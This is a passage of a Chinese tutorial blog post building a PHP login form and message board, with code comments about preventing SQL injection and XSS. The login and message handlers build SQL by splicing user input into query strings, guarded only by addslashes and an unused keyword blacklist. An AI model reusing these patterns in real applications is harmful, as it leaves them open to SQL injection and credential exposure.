class="selector-tag">font-size</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">cursor</span><span class="selector-pseudo">:pointer</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">form&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">margin-left</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>注册页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--form表单--&gt;</span><span class="comment">&lt;!--当前目录下"./handle.php"路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./handle.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>/&gt;</span><span class="comment">&lt;!--提交的方式隐藏的--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用&lt;div&gt;做表单元素&lt;/div&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文本框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"uid"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--uid=用户名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>输入密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd_1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--pwd=密码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>再次输入密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd_2"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--pwd=密码--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--只要点击按钮submit提交        要显示的    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-5-登录处理"><a href="#2-5-登录处理" class="headerlink" title="2.5 登录处理"></a>2.5 登录处理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//取到数据完了往数据库里送的过程</span></span><br><span class="line">session_start();</span><br><span class="line">$id =$_POST[<span class="string">"uid"</span>];</span><br><span class="line">$pwd =$_POST[<span class="string">"pwd"</span>];</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"uid"</span>]=$id;</span><br><span class="line"><span class="comment">//$name =$_POST["name"];</span></span><br><span class="line"><span class="comment">//echo $uid,$pwd;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************/</span></span><br><span class="line"><span class="comment">// 防SQL注入</span></span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">&#123;</span><br><span class="line">    $id  = addslashes($id);           <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">    $pwd = addslashes($pwd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************/</span></span><br><span class="line"><span class="comment">/******************************/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $str = str_replace(<span class="string">"and"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"execute"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"count"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"chr"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"mid"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"master"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"truncate"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"declare"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">   <span class="comment">//echo $str;</span></span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************/</span></span><br><span class="line">$host=<span class="string">'localhost'</span>;</span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpwd=<span class="string">'******'</span>;</span><br><span class="line">$dbname=<span class="string">'test'</span>;</span><br><span class="line"><span class="comment">//connect mysql</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($host,$dbuser,$dbpwd,$dbname);</span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_error())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否填写</span></span><br><span class="line"><span class="keyword">if</span>($id==<span class="string">""</span>||$pwd==<span class="string">""</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"请填写完成！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://127.0.0.1/hello.php"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;    </span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断密码是否相等</span></span><br><span class="line">$str=<span class="string">"select * from user where username='$id' and password='$pwd'"</span>;</span><br><span class="line">$result=$conn-&gt;query($str);</span><br><span class="line"><span class="keyword">if</span>($row=$result-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">header(<span class="string">"refresh:0;url=add.php"</span>);<span class="comment">//如果成功跳转至welcome.html页面</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if($pa==1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    echo"&lt;script type="."\""."text/javascript"."\""."&gt;"."window.location="."\""."http://127.0.0.1/login.php"."\""."&lt;/script&gt;";   </span></span><br><span class="line"><span class="comment">    exit; </span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"用户不存在/密码错误"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://127.0.0.1/hello.php"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;   </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="3-动态网站搭建留言板"><a href="#3-动态网站搭建留言板" class="headerlink" title="3. 动态网站搭建留言板"></a>3. 动态网站搭建留言板</h1><h2 id="3-1-留言界面"><a href="#3-1-留言界面" class="headerlink" title="3.1 留言界面"></a>3.1 留言界面</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    header(<span class="string">'Content-type: text/html; charset=UTF8'</span>);</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./css/index1.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>我的留言板.添加留言<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"./images/7.jpg"</span> <span class="attr">style</span>=<span class="string">"background-size:cover;"</span> &gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"user: "</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $_SESSION[<span class="string">"uid"</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我的留言板<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">value</span> = <span class="string">"添加留言"</span> <span class="attr">onclick</span>=<span class="string">"location.href='add.php'"</span> <span class="attr">class</span>=<span class="string">"button"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">value</span> = <span class="string">"查看留言"</span> <span class="attr">onclick</span>=<span class="string">"location.href='show.php'"</span> <span class="attr">class</span>=<span class="string">"button"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">value</span> = <span class="string">"退出登陆"</span> <span class="attr">onclick</span>=<span class="string">"location.href='hello.php'"</span> <span class="attr">class</span>=<span class="string">"button"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span> <span class="attr">width</span> = <span class="string">"70%"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"k1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"doAdd.php"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Add A Message</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>What's New To Share With You。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Your Name :<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">placeholder</span>=<span class="string">"Your Full Name"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Title :<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">placeholder</span>=<span class="string">"Please input title"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Message :<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">placeholder</span>=<span class="string">"Your Message to Us"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-left:125px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">class</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"reset"</span> <span class="attr">value</span> = <span class="string">"重置"</span> <span class="attr">class</span>=<span class="string">"reset"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-留言处理"><a href="#3-2-留言处理" class="headerlink" title="3.2  留言处理"></a>3.2  留言处理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">    $id=$_SESSION[<span class="string">"uid"</span>];</span></span><br><span class="line"><span class="php">    $title = $_POST[<span class="string">"title"</span>];  </span></span><br><span class="line"><span class="php">    $author = $_POST[<span class="string">"author"</span>];</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">"authorl"</span>]=$author;</span></span><br><span class="line"><span class="php">    $content = $_POST[<span class="string">"content"</span>];  </span></span><br><span class="line"><span class="php">    $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span> <span class="string">"connet.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span> <span class="string">'mysqlconfig.php'</span>;</span></span><br><span class="line"><span class="php"><span class="comment">/******************************/</span></span></span><br><span class="line"><span class="php"><span class="comment">//防存储型xss</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($str)</span>   //黑名单 过滤敏感字符 但不好</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">   $str = str_replace(<span class="string">"&lt;/script&gt;"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">   $str = str_replace(<span class="string">"&lt;script&gt;"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">   $str = str_replace(<span class="string">"alert"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">   $str = str_replace(<span class="string">"&lt;body&gt;"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">   $str = str_replace(<span class="string">"&lt;/body&gt;"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">   <span class="comment">//echo $str;</span></span></span><br><span class="line"><span class="php">   <span class="keyword">return</span> $str;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//$author=dowith_sql($author);</span></span></span><br><span class="line"><span class="php"><span class="comment">//$title=dowith_sql($title);</span></span></span><br><span class="line"><span class="php"><span class="comment">//$content=dowith_sql($content);</span></span></span><br><span class="line"><span class="php">$author=htmlspecialchars($author, ENT_QUOTES);</span></span><br><span class="line"><span class="php">$title=htmlspecialchars($title, ENT_QUOTES);</span></span><br><span class="line"><span class="php">$content=htmlspecialchars($content, ENT_QUOTES);</span></span><br><span class="line"><span class="php"><span class="comment">/******************************/</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ma1=<span class="keyword">new</span> DB();</span></span><br><span class="line"><span class="php">    $link=$ma1-&gt;connect();</span></span><br><span class="line"><span class="php">    $sql = <span class="string">"insert into text (user,title,author,ip,liuyan,time) values('$id','$title','$author','$ip','$content',now())"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($title!=<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($author!=<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php">    $res = $ma1-&gt;insertl($link,$sql);</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($author==<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请输入留言者！');location='add.php';&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($title==<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请输入留言标题！');location='add.php';&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="3-3-留言显示"><a href="#3-3-留言显示" class="headerlink" title="3.3 留言显示"></a>3.3 留言显示</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header('Content-<span class="keyword">type</span>: text/html; charset=UTF8');</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">       <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">"name"</span>];</span><br><span class="line">       <span class="comment">//**************/</span></span><br><span class="line">       <span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>, ENT_QUOTES);<span class="comment">//防反射型xss</span></span><br><span class="line">       <span class="comment">//***************/</span></span><br><span class="line">       ?&gt;</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;head&gt;  </span><br><span class="line">    &lt;title&gt;我的留言板.查看留言&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> <span class="keyword">type</span>=<span class="string">"text/css"</span> href=<span class="string">"./css/index1.css"</span>&gt;</span><br><span class="line">    &lt;/head&gt;  </span><br><span class="line">    &lt;body background=<span class="string">"./images/7.jpg"</span> style=<span class="string">"background-size:cover;background-attachment: fixed;"</span> &gt;  </span><br><span class="line">    &lt;center&gt;  </span><br><span class="line">     &lt;h2&gt;我的留言板&lt;/h2&gt;  </span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span> = <span class="string">"button"</span> value = <span class="string">"添加留言"</span> onclick=<span class="string">"location.href='add.php'"</span> <span class="keyword">class</span>=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span> = <span class="string">"button"</span> value = <span class="string">"查看留言"</span> onclick=<span class="string">"location.href='show.php'"</span> <span class="keyword">class</span>=<span class="string">"button"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span> = <span class="string">"button"</span> value = <span class="string">"退出登陆"</span> onclick=<span class="string">"location.href='hello.php';logout()"</span> <span class="keyword">class</span>=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> value='&lt;?php echo <span class="variable">$name</span>?&gt;'&gt;</span><br><span class="line">    &lt;hr width = <span class="string">"70%"</span>&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">       &lt;?php    